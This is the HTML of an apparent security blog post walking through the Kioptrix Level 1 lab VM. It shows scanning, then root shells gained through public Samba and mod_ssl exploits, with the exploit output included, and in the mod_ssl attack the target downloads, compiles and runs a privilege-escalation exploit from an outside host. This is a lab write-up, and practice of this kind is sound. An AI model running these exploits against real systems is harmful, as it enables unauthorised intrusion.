@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <script>
+        // UNCOMMENT AND USE YOUR VARIABLES FOR DISQUS AND GOOGLE ANALYTICS
+        var d_id  = 'rootshellz',
+        //     g_id  = 'UA-XXXXXXXX-X', // Format: UA-########-#, Example: UA-11220899-1
+        //     g_url = 'XXXXXXX.XXX' // Format: #####.####, Example: webdesignporto.com
+    </script>
+
+    <title>Kioptrix: Level 1 (#1) Walkthrough</title>
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="MobileOptimized" content="320" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" type="text/css" href="/assets/highlighter/prettify.css?v=8d33012fb0" />
+    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css?v=8d33012fb0" />
+
+    <link rel="icon" href="/favicon.png" type="image/png" />
+    <link rel="canonical" href="https://blog.rootshellz.com/kioptrix-walkthrough-1/" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="amphtml" href="https://blog.rootshellz.com/kioptrix-walkthrough-1/amp/" />
+    
+    <meta property="og:site_name" content="rootshellz" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Kioptrix: Level 1 (#1) Walkthrough" />
+    <meta property="og:description" content="Intro Defcon 25 is in the books and my Penetration Testing Training with Kali Linux (PWK) / Offensive Security Certified Professional (OSCP) lab time is up.  I now have a bit of extra time but I also want to keep my forward momentum in the land of pwning boxes...  Accordingly, this" />
+    <meta property="og:url" content="https://blog.rootshellz.com/kioptrix-walkthrough-1/" />
+    <meta property="og:image" content="https://blog.rootshellz.com/content/images/2018/07/Kioptrix-1-Cover.jpg" />
+    <meta property="article:published_time" content="2017-08-16T05:24:00.000Z" />
+    <meta property="article:modified_time" content="2018-07-30T08:01:35.000Z" />
+    <meta property="article:tag" content="Boot2Root" />
+    <meta property="article:tag" content="VulnHub" />
+    <meta property="article:tag" content="OSCP" />
+    <meta property="article:tag" content="Kioptrix" />
+    
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Kioptrix: Level 1 (#1) Walkthrough" />
+    <meta name="twitter:description" content="Intro Defcon 25 is in the books and my Penetration Testing Training with Kali Linux (PWK) / Offensive Security Certified Professional (OSCP) lab time is up.  I now have a bit of extra time but I also want to keep my forward momentum in the land of pwning boxes...  Accordingly, this" />
+    <meta name="twitter:url" content="https://blog.rootshellz.com/kioptrix-walkthrough-1/" />
+    <meta name="twitter:image" content="https://blog.rootshellz.com/content/images/2018/07/Kioptrix-1-Cover.jpg" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="rootshellz" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Boot2Root, VulnHub, OSCP, Kioptrix" />
+    <meta name="twitter:site" content="@rootshellz" />
+    <meta name="twitter:creator" content="@rootshellz" />
+    <meta property="og:image:width" content="660" />
+    <meta property="og:image:height" content="371" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "rootshellz",
+        "url": "https://blog.rootshellz.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://blog.rootshellz.com/content/images/2018/07/Blog-Logo.png"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "rootshellz",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://blog.rootshellz.com/content/images/2018/07/rootshellz.jpg",
+            "width": 1630,
+            "height": 1631
+        },
+        "url": "https://blog.rootshellz.com/author/rootshellz/",
+        "sameAs": [
+            "https://twitter.com/rootshellz"
+        ]
+    },
+    "headline": "Kioptrix: Level 1 (#1) Walkthrough",
+    "url": "https://blog.rootshellz.com/kioptrix-walkthrough-1/",
+    "datePublished": "2017-08-16T05:24:00.000Z",
+    "dateModified": "2018-07-30T08:01:35.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://blog.rootshellz.com/content/images/2018/07/Kioptrix-1-Cover.jpg",
+        "width": 660,
+        "height": 371
+    },
+    "keywords": "Boot2Root, VulnHub, OSCP, Kioptrix",
+    "description": "Intro\nDefcon 25 [https://www.defcon.org/html/defcon-25/dc-25-index.html]  is in the\nbooks and my Penetration Testing Training with Kali Linux (PWK)\n[https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/] \n / Offensive Security Certified Professional (OSCP)\n[https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/] \n lab time is up. I now have a bit of extra time but I also want to ke",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://blog.rootshellz.com/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 3.36" />
+    <link rel="alternate" type="application/rss+xml" title="rootshellz" href="https://blog.rootshellz.com/rss/" />
+    <!-- https://www.jsdelivr.com/package/npm/prism-themes?path=themes -->
+<!-- These three work together / are additive -->
+<link href="https://cdn.jsdelivr.net/npm/prism-themes@1.5.0/themes/prism-synthwave84.css" rel="stylesheet" / >
+<link href="https://cdn.jsdelivr.net/npm/prism-themes@1.5.0/themes/prism-vsc-dark-plus.css" rel="stylesheet" / >
+<link href="https://cdn.jsdelivr.net/npm/prism-themes@1.5.0/themes/prism-xonokai.css" rel="stylesheet" / >
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-TM0JKQZ7H1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-TM0JKQZ7H1');
+</script>
+
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+      ga('create', g_id, g_url);
+      ga('send', 'pageview');
+
+    </script>
+</head>
+<body class="post-template tag-boot2root tag-vulnhub tag-oscp tag-kioptrix">
+
+    
+
+<main class="content" role="main">
+
+    <article class="post tag-boot2root tag-vulnhub tag-oscp tag-kioptrix">
+
+        <header class="post-header">
+            <a id="blog-logo" href="https://blog.rootshellz.com">
+                    <img src="/content/images/2018/07/Blog-Logo.png" alt="Blog Logo" />
+            </a>
+        </header>
+
+
+        <span class="post-meta"><time datetime="2017-08-15">15 Aug 2017</time> on <a href="/tag/boot2root/">Boot2Root</a> | <a href="/tag/vulnhub/">VulnHub</a> | <a href="/tag/oscp/">OSCP</a> | <a href="/tag/kioptrix/">Kioptrix</a></span>
+
+        <h1 class="post-title">Kioptrix: Level 1 (#1) Walkthrough</h1>
+
+        <section class="post-content">
+            <!--kg-card-begin: markdown--><h1 id="intro">Intro</h1>
+<p><a href="https://www.defcon.org/html/defcon-25/dc-25-index.html">Defcon 25</a> is in the books and my <a href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/">Penetration Testing Training with Kali Linux (PWK)</a> / <a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/">Offensive Security Certified Professional (OSCP)</a> lab time is up.  I now have a bit of extra time but I also want to keep my forward momentum in the land of pwning boxes...  Accordingly, this seems like an opportune time to start posting, and what better topic than gaining root shellz?</p>
+<p>I went in search of pwnables that were similar to the boxes I experienced in the PWK lab and found the <a href="http://www.kioptrix.com/blog/test-page/">Kioptrix</a> series of VMs recommended.  The series is also on <a href="https://www.vulnhub.com/series/kioptrix,8/">VulnHub</a>.  Kioptrix consists of five machines, each of increasing difficulty.  The challenges appear to be a bit older, but still seem relevant.</p>
+<p>For those that don't know, a pwnable or Boot2Root is an intentionally vulnerable virtual machine (VM) that provides a challenge to hackers.  The goal is usually to root the box.  Some challenges have an intended solution and guide you down the correct path, others expect you to attack the box by any means necessary.</p>
+<p>Let's get started with the first box.  I downloaded the .rar file, decompressed it, and spun up the VM in <a href="https://www.vmware.com/products/fusion.html">VMware Fusion</a>.  After booting, I was presented with the following screen:<br>
+<img src="https://blog.rootshellz.com/content/images/2017/08/Kioptrix1-VM-Console.png" alt="Kioptrix1-VM-Console"></p>
+<h1 id="scanningandenumeration">Scanning and Enumeration</h1>
+<h2 id="identifyingtargetaddressdhcp">Identifying Target Address (DHCP)</h2>
+<p>The host grabs an address via DHCP as it boots.  Identifying the host on my network was simple as the VM is in a low traffic local subnet on my host machine.</p>
+<pre><code class="language-shell-output">root@kali:~# ifconfig eth1 | grep &quot;inet\s&quot;
+inet 172.16.2.129  netmask 255.255.255.0  broadcast 172.16.2.255
+</code></pre>
+<pre><code class="language-shell-output">root@kali:~# nmap -T4 -sn 172.16.2.0/24
+
+Starting Nmap 7.25BETA2 ( https://nmap.org )
+Nmap scan report for 172.16.2.1
+Host is up (0.0011s latency).
+MAC Address: 00:50:56:C0:00:02 (VMware)
+Nmap scan report for 172.16.2.130
+Host is up (0.00027s latency).
+MAC Address: 00:0C:29:E8:BF:7E (VMware)
+Nmap scan report for 172.16.2.254
+Host is up (0.00017s latency).
+MAC Address: 00:50:56:E8:27:6D (VMware)
+Nmap scan report for 172.16.2.129
+Host is up.
+Nmap done: 256 IP addresses (4 hosts up) scanned in 13.11 seconds
+</code></pre>
+<p>The scan shows only four live IPs on my target subnet (172.16.2.0/24): the gateway (.1), DHCP server (.254), my Kali machine (.129), and the target, Kioptrix1, which has been assigned 172.16.2.130.</p>
+<h2 id="enumerateallthethings">Enumerate All the things</h2>
+<h3 id="nmap">nmap</h3>
+<pre><code class="language-shell-output">root@kali:~# nmap -T4 -Pn -sV -O -p- 172.16.2.130
+
+Starting Nmap 7.25BETA2 ( https://nmap.org )
+Nmap scan report for 172.16.2.130
+Host is up (0.00042s latency).
+Not shown: 65528 closed ports
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+111/tcp   open  rpcbind     2 (RPC #100000)
+139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+1024/tcp  open  status      1 (RPC #100024)
+45295/tcp open  unknown
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port45295-TCP:V=7.25BETA2%I=7%D=8/12%Time=598EC8C9%P=i686-pc-linux-gnu%
+SF:r(GenericLines,3E,&quot;/bin//sh:\x20\r:\x20command\x20not\x20found\n/bin//s
+SF:h:\x20\r:\x20command\x20not\x20found\n&quot;)%r(GetRequest,1FD,&quot;Can't\x20ign
+SF:ore\x20signal\x20CHLD,\x20forcing\x20to\x20default\.\nUse\x20of\x20unin
+SF:itialized\x20value\x20in\x20pattern\x20match\x20\(m//\)\x20at\x20/usr/l
+SF:ib/perl5/site_perl/5\.6\.0/URI/Heuristic\.pm\x20line\x2097\.\n&lt;HTML&gt;\n&lt;
+SF:HEAD&gt;&lt;TITLE&gt;An\x20Error\x20Occurred&lt;/TITLE&gt;&lt;/HEAD&gt;\n&lt;BODY&gt;\n&lt;H1&gt;An\x20E
+SF:rror\x20Occurred&lt;/h1&gt;\n500\x20Can't\x20locate\x20object\x20method\x20\&quot;
+SF:epath\&quot;\x20via\x20package\x20\&quot;URI::file\&quot;\n\n&lt;/BODY&gt;\n&lt;/HTML&gt;\n&lt;HTML&gt;\
+SF:n&lt;HEAD&gt;&lt;TITLE&gt;An\x20Error\x20Occurred&lt;/TITLE&gt;&lt;/HEAD&gt;\n&lt;BODY&gt;\n&lt;H1&gt;An\x2
+SF:0Error\x20Occurred&lt;/h1&gt;\n500\x20Can't\x20connect\x20to\x20HTTP:80\x20\(
+SF:Bad\x20hostname\x20'HTTP'\)\n\n&lt;/BODY&gt;\n&lt;/HTML&gt;\n/bin//sh:\x20\r:\x20co
+SF:mmand\x20not\x20found\n&quot;)%r(HTTPOptions,44,&quot;/bin//sh:\x20OPTIONS:\x20co
+SF:mmand\x20not\x20found\n/bin//sh:\x20\r:\x20command\x20not\x20found\n&quot;)%
+SF:r(RTSPRequest,44,&quot;/bin//sh:\x20OPTIONS:\x20command\x20not\x20found\n/bi
+SF:n//sh:\x20\r:\x20command\x20not\x20found\n&quot;)%r(Help,23,&quot;/bin//sh:\x20HE
+SF:LP\r:\x20command\x20not\x20found\n&quot;)%r(TLSSessionReq,4F,&quot;/bin//sh:\x20\
+SF:x16\x03i\x01e\x03\x03U\x1c\xa7\xe4random1random2random3random4\x0c/:\x2
+SF:0No\x20such\x20file\x20or\x20directory\n&quot;)%r(Kerberos,2E,&quot;/bin//sh:\x20
+SF:qj\x81n0\x81k\xa1\x03\x02\x01\x05\xa2\x03\x02\x01:\x20command\x20not\x2
+SF:0found\n&quot;)%r(FourOhFourRequest,1F4,&quot;Can't\x20ignore\x20signal\x20CHLD,\
+SF:x20forcing\x20to\x20default\.\nUse\x20of\x20uninitialized\x20value\x20i
+SF:n\x20pattern\x20match\x20\(m//\)\x20at\x20/usr/lib/perl5/site_perl/5\.6
+SF:\.0/URI/Heuristic\.pm\x20line\x2097\.\n&lt;HTML&gt;\n&lt;HEAD&gt;&lt;TITLE&gt;An\x20Error
+SF:\x20Occurred&lt;/TITLE&gt;&lt;/HEAD&gt;\n&lt;BODY&gt;\n&lt;H1&gt;An\x20Error\x20Occurred&lt;/h1&gt;\n
+SF:404\x20File\x20`/nice\x20ports,/Trinity\.txt\.bak'\x20does\x20not\x20ex
+SF:ist\n&lt;/BODY&gt;\n&lt;/HTML&gt;\n&lt;HTML&gt;\n&lt;HEAD&gt;&lt;TITLE&gt;An\x20Error\x20Occurred&lt;/TI
+SF:TLE&gt;&lt;/HEAD&gt;\n&lt;BODY&gt;\n&lt;H1&gt;An\x20Error\x20Occurred&lt;/h1&gt;\n500\x20Can't\x20
+SF:connect\x20to\x20HTTP:80\x20\(Bad\x20hostname\x20'HTTP'\)\n\n&lt;/BODY&gt;\n&lt;
+SF:/HTML&gt;\n/bin//sh:\x20\r:\x20command\x20not\x20found\n&quot;);
+MAC Address: 00:0C:29:E8:BF:7E (VMware)
+Device type: general purpose
+Running: Linux 2.4.X
+OS CPE: cpe:/o:linux:linux_kernel:2.4
+OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
+Network Distance: 1 hop
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 144.28 seconds
+</code></pre>
+<p>There is plenty going on here, so I started by running the OpenSSH, Apache, mod_ssl, and OpenSSL versions through <a href="https://www.exploit-db.com/">Exploit DB</a>.  There were some decent matches, but I wanted to dig in to the SMB service first.  Usually when SMB fails, it fails hard...</p>
+<h1 id="exploitation1smb">Exploitation #1 - SMB</h1>
+<p>I wanted to get more info on the netbios service (on 139/tcp) at least get a version.</p>
+<pre><code class="language-shell-output">root@kali:~# enum4linux 172.16.2.130
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ )
+
+[... snip ...]
+
+ ====================================== 
+|    OS information on 172.16.2.130    |
+ ====================================== 
+[+] Got OS info for 172.16.2.130 from smbclient: Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+[+] Got OS info for 172.16.2.130 from srvinfo:
+  KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
+  platform_id     : 500
+  os version      : 4.5
+  server type     : 0x9a03
+
+[... snip ...]
+
+enum4linux complete on Fri Aug 11 22:42:00 2017
+</code></pre>
+<p>Ahh, there's the version: Samba <em>2.2.1a</em>, which I then ran through Exploit DB:</p>
+<pre><code class="language-shell-output">root@kali:~# searchsploit Samba | grep &quot;2\.2\.&quot;
+Samba 2.2.x - Remote Root Buffer Overflow                            | ./linux/remote/7.pl
+[... snip ...]
+</code></pre>
+<p>This looked promising, so I attempted the exploit:</p>
+<pre><code class="language-shell-output">root@kali:~# perl /usr/share/exploitdb/platforms/linux/remote/7.pl
+
+ trans2root.pl - Samba 2.2.x 'trans2open()' Remote Exploit
+===================================
+
+    Usage: 
+           /usr/share/exploitdb/platforms/linux/remote/7.pl &lt;options&gt; -t &lt;target type&gt; -H &lt;your ip&gt; -h &lt;target ip&gt;
+  Options:  
+           -M (S|B) &lt;single or brute mode&gt;
+           -r       &lt;return address for single mode&gt;
+           -p       &lt;alternate Samba port&gt;
+           -P       &lt;alternate listener port&gt;
+  Targets:
+            linx86
+            solx86
+            fbsdx86
+</code></pre>
+<pre><code class="language-shell-output">root@kali:~# perl /usr/share/exploitdb/platforms/linux/remote/7.pl -t linx86 -H 172.16.2.129 -h 172.16.2.130
+[*] Using target type: linx86
+[*] Listener started on port 1981
+[*] Starting brute force mode...
+[*] Return Address: 0xbf0001ff                              
+root@kali:~#
+</code></pre>
+<p>Unfortunately, after running through the address brute-force, this exploit script did not seem to do the trick.</p>
+<p>I was still convinced that this vulnerability was exploitable, so I went looking for another working exploit.  I simply Googled &quot;Samba 2.2.1a&quot; and my first hit was for an exploit actually labeled Samba 2.2.<em>8</em>, but stated, &quot;Remote root exploit for Samba 2.2.x and prior that works against Linux (all distributions) [...].&quot;</p>
+<p><img src="https://blog.rootshellz.com/content/images/2017/08/Google-Samba-2.2.1a.png" alt="Google-Samba-2.2.1a"></p>
+<p>As a side note, this exploit labeling makes it difficult to identify this exploit with the searchsploit tool.  If anyone know how to better use searchsploit, let me know.</p>
+<p>At any rate, I located, compiled, and ran the exploit:</p>
+<pre><code class="language-shell-output">root@kali:~# searchsploit &quot;Samba 2.2.8&quot;
+------------------------------------------------------------------------------------------------------------------- ----------------------------------
+ Exploit Title                                                                                                     |  Path
+                                                                                                                   | (/usr/share/exploitdb/platforms)
+------------------------------------------------------------------------------------------------------------------- ----------------------------------
+Samba 2.2.8 - Remote Root Exploit                                                                                  | ./linux/remote/10.c
+</code></pre>
+<pre><code class="language-shell-output">root@kali:~# gcc -o sambasploit /usr/share/exploitdb/platforms/linux/remote/10.c 
+root@kali:~# file sambasploit 
+sambasploit: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3209817b6f2b2e5f713e16f8e55dcf0fbb219feb, not stripped
+</code></pre>
+<pre><code class="language-shell-output">root@kali:~# ./sambasploit 
+samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)
+--------------------------------------------------------------
+Usage: ./sambasploit [-bBcCdfprsStv] [host]
+
+-b &lt;platform&gt;   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)
+-B &lt;step&gt;       bruteforce steps (default = 300)
+-c &lt;ip address&gt; connectback ip address
+-C &lt;max childs&gt; max childs for scan/bruteforce mode (default = 40)
+-d &lt;delay&gt;      bruteforce/scanmode delay in micro seconds (default = 100000)
+-f              force
+-p &lt;port&gt;       port to attack (default = 139)
+-r &lt;ret&gt;        return address
+-s              scan mode (random)
+-S &lt;network&gt;    scan mode
+-t &lt;type&gt;       presets (0 for a list)
+-v              verbose mode
+</code></pre>
+<pre><code class="language-shell-output">root@kali:~# ./sambasploit -v -b 0 172.16.2.130
+samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)
+--------------------------------------------------------------
++ Verbose mode.
++ Bruteforce mode. (Linux)
++ Host is running samba.
++ Using ret: [0xbffffed4]
++ Using ret: [0xbffffda8]
++ Worked!
+--------------------------------------------------------------
+*** JE MOET JE MUIL HOUWE
+Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
+uid=0(root) gid=0(root) groups=99(nobody)
+id    
+uid=0(root) gid=0(root) groups=99(nobody)
+whoami
+root
+</code></pre>
+<p>Boom, rootshellz!  At this point, instead of moving on to persistence and pilfering the box, I instead wanted to see if I could find any other ways to pwn Kioptrix1.</p>
+<p>Unfamiliar with &quot;JE MOET JE MUIL HOUWE,&quot; I found it is Dutch for &quot;YOU MUST HAVE YOUR MOUSE.&quot;  It is also, apparently, a <a href="https://www.youtube.com/watch?v=BcpirI2BcWI">hardcore song by Neophyte</a>.  If there is some further reference here, it is lost on me.</p>
+<h1 id="exploitation2apacheandmod_ssl">Exploitation #2 - Apache and mod_ssl</h1>
+<p>Searching for Apache and mod_ssl vulnerabilities / exploits turned up a promising hit:</p>
+<pre><code class="language-shell-output">root@kali:~# searchsploit apache mod_ssl
+---------------------------------------------------------------------------------------------------------------------------------- ----------------------------------
+ Exploit Title                                                                                                                    |  Path
+                                                                                                                                  | (/usr/share/exploitdb/platforms)
+---------------------------------------------------------------------------------------------------------------------------------- ----------------------------------
+Apache/mod_ssl (&lt; 2.8.7) OpenSSL - 'OpenFuckV2.c' Remote Exploit (2)                                                              | ./unix/remote/764.c
+[... snip ...]
+</code></pre>
+<p>I attempted to compile this exploit, using libcrypto, but it failed miserably.  I did some Googling and found an article by <a href="http://paulsec.github.io/">PaulSec</a> about <a href="http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/">updating this exploit</a> for modern pwning.  PaulSec's modifications worked with two exceptions:  First, I had to change the URL, as suggested by PauSec, but I needed https instead of http (<a href="https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c">https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</a>).  Second, on my Kali install, I had to install libssl1.0-dev as opposed to just libssl1-dev.  In fact, this required removing my existing libssl-dev package.  Once all modifications were made to the exploit an my build environment, I was able to compile and use the exploit:</p>
+<pre><code class="language-shell-output">root@kali:~# gcc -o OpenFuckIn2017 OpenFuckIn2017.c -lcrypto
+root@kali:~# file OpenFuckIn2017
+OpenFuckIn2017: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b6026a5ef5267c1ff4612467c68fe9f24f8449c9, not stripped
+</code></pre>
+<pre><code class="language-shell-output">root@kali:~# ./OpenFuckIn2017
+
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+: Usage: ./OpenFuckIn2017 target box [port] [-c N]
+
+  target - supported box eg: 0x00
+  box - hostname or IP address
+  port - port for ssl connection
+  -c open N connections. (use range 40-50 if u dont know)
+  
+
+  Supported OffSet:
+  [... snip ...]
+Fuck to all guys who like use lamah ddos. Read SRC to have no surprise
+</code></pre>
+<p>I needed to identify the target to use:</p>
+<pre><code class="language-shell-output">root@kali:~# ./OpenFuckIn2017 | grep RedHat | grep 1.3.20
+  0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
+  0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
+</code></pre>
+<p>I attempted the first target without luck:</p>
+<pre><code class="language-shell-output">root@kali:~# ./OpenFuckIn2017 0x6a 172.16.2.130
+
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80fc080
+Ready to send shellcode
+Spawning shell...
+Good Bye!
+</code></pre>
+<p>So I moved on to the second:</p>
+<pre><code class="language-shell-output">root@kali:~# ./OpenFuckIn2017 0x6b 172.16.2.130
+
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f8068
+Ready to send shellcode
+Spawning shell...
+bash: no job control in this shell
+bash-2.05$ 
+exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304- 
+--01:17:47--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           =&gt; `ptrace-kmod.c'
+Connecting to dl.packetstormsecurity.net:80... 
+dl.packetstormsecurity.net: Host not found.
+gcc: ptrace-kmod.c: No such file or directory
+gcc: No input files
+rm: cannot remove `ptrace-kmod.c': No such file or directory
+bash: ./p: No such file or directory
+bash-2.05$ 
+bash-2.05$ id
+id
+uid=48(apache) gid=48(apache) groups=48(apache)
+bash-2.05$ pwd
+pwd
+/tmp
+</code></pre>
+<p>Awesome, I received a shell, albeit not root.  This is when I discovered that because I set up Kioptrix1 without Internet access, my initial remote exploit was unable to download the ptrace/kmod local root exploit from packetstormsecurity.net.  I proceeded to stage the privilege escalation exploit locally on my Kali box:</p>
+<pre><code class="language-shell-output">root@kali:~# wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+--2017-08-13 10:56:21--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+Resolving dl.packetstormsecurity.net (dl.packetstormsecurity.net)... 198.84.60.200
+Connecting to dl.packetstormsecurity.net (dl.packetstormsecurity.net)|198.84.60.200|:80... connected.
+HTTP request sent, awaiting response... 301 Moved Permanently
+Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
+--2017-08-13 10:56:22--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+Connecting to dl.packetstormsecurity.net (dl.packetstormsecurity.net)|198.84.60.200|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3921 (3.8K) [text/x-csrc]
+Saving to: ‘ptrace-kmod.c’
+
+ptrace-kmod.c                                        100%[====================================================================================================================&gt;]   3.83K  --.-KB/s    in 0s      
+
+2017-08-13 10:56:22 (70.1 MB/s) - ‘ptrace-kmod.c’ saved [3921/3921]
+</code></pre>
+<p>I then updated my exploit to download the file from my Kali box, again using the Python Simple HTTP server.</p>
+<pre><code class="language-shell-output">root@kali:~# cp OpenFuckIn2017.c OpenFuckIn2017LocalDL.c
+root@kali:~# sed -i 's*https://dl.packetstormsecurity.net/0304-exploits/*http://172.16.2.129:8000/*' OpenFuckIn2017LocalDL.c
+root@kali:~# gcc -o OpenFuckIn2017LocalDL OpenFuckIn2017LocalDL.c -lcrypto
+</code></pre>
+<pre><code class="language-shell-output">root@kali:~# python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+172.16.2.130 - - [13/Aug/2017 11:03:20] &quot;GET /ptrace-kmod.c HTTP/1.0&quot; 200 -
+</code></pre>
+<pre><code class="language-shell-output">root@kali:~# ./OpenFuckIn2017LocalDL 0x6b 172.16.2.130
+
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f8068
+Ready to send shellcode
+Spawning shell...
+bash: no job control in this shell
+bash-2.05$ 
+ gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; 172.16.2.129:8000/ptrace-kmod.c; 
+--00:02:13--  http://172.16.2.129:8000/ptrace-kmod.c
+           =&gt; `ptrace-kmod.c'
+Connecting to 172.16.2.129:8000... connected!
+HTTP request sent, awaiting response... 200 OK
+Length: 3,921 [text/plain]
+
+    0K ...                                                   100% @   3.74 MB/s
+
+00:02:13 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]
+
+[+] Attached to 984
+[+] Waiting for signal
+[+] Signal caught
+[+] Shellcode placed at 0x4001189d
+[+] Now wait for suid shell...
+whoami
+root
+
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
